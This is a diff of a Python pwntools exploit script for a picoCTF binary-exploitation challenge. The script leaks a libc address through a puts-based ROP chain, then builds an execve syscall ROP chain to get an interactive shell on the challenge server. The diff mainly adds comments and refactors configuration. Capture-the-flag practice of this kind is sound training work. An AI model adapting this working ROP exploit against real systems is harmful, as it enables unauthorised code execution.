@@ -13,24 +13,24 @@ context.terminal = ["konsole", "-e"]
 
 REMOTE = ("mercury.picoctf.net", 49464)
 
+args.debug = True
+args.local = True
 
 class Exploit:
-    def __init__(self, local=False, debug=False):
-        if local:
+    def __init__(self):
+        if args.local:
             self.process = "process()"
         else:
             self.process = "remote(REMOTE[0], REMOTE[1])"
-        self.debug = debug
+        self.debug = args.debug
 
     def leak_libc(self, proc: process) -> int:
         '''get libc address leak via puts function'''
-        proc.recvuntil(b'sErVeR!\n')
-
         payload = b'A'*112      # buffer
         payload += b'A'*24      # junk
 
         payload += pack("<Q", ROP(exe).find_gadget(['pop rdi', 'ret'])[0])
-        payload += pack("<Q", exe.got['puts'])
+        payload += pack("<Q", exe.got['puts']) # Referece: https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
         payload += pack("<Q", exe.plt['puts'])
         payload += pack("<Q", exe.symbols['main']) # return to main
 
@@ -43,7 +43,8 @@ class Exploit:
         
         return p-0x80a30 # -0x80a30 is from libc_base_address - libc_leaked address
 
-    def execve(self, proc: process, libc_base_address):
+    def execve_rop(self, proc: process, libc_base_address):
+        '''forge the execve ROP chain'''
         payload = b'A'*112      # buffer
         payload += b'A'*24      # junk
         
@@ -54,15 +55,15 @@ class Exploit:
         payload += pack("<Q", 0x3b) # execve
         
         payload += pack("<Q", libc_base_address+ROP(libc).find_gadget(['pop rsi', 'ret'])[0])
-        payload += pack("<Q", 0x0)
+        payload += pack("<Q", 0x0) # set rsi to NULL
         
         payload += pack("<Q", libc_base_address+ROP(libc).find_gadget(['pop rdx', 'ret'])[0])
-        payload += pack("<Q", 0x0)
+        payload += pack("<Q", 0x0) # set rdx to NULL
         
         payload += pack("<Q", libc_base_address+ROP(libc).find_gadget(['syscall'])[0])
         
         proc.sendline(payload)
-        proc.recvline()
+        # proc.recvline()
         proc.interactive()
         return
 
@@ -76,9 +77,10 @@ class Exploit:
                 continue
                 """
                 gdb.attach(r, gdbscript=script)
-
+            
+            r.recvuntil(b'sErVeR!\n')
             libc_base_address = self.leak_libc(r)
-            self.execve(r, libc_base_address)
+            self.execve_rop(r, libc_base_address)
 
-
-Exploit(local=False, debug=False).start()
+if __name__ == "__main__":
+    Exploit().start()
